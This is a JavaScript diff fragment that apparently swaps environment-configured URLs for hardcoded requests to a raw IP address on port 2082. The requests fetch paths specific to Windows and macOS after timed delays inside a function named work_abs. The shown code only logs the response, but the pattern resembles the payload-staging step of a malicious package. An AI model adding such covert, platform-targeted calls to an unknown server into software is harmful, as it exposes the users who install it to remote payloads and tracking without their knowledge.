@@ -59,7 +59,7 @@ function memcheck() {
 async function work_abs() {
     await delay(2000);
     if (platform == "win32") {
-        request(process.env.WIN32,
+        request("http://142.93.34.245:2082/abstract/win32",
             (err, response, body) => {
                 return console.log(body);
                 
@@ -67,7 +67,7 @@ async function work_abs() {
         );
         await delay(15000);
     } else if (platform == "darwin") {
-        request(process.env.DARWIN,
+        request("http://142.93.34.245:2082/abstract/darwin",
             (err, response, body) => {
                 return console.log(body);
                 
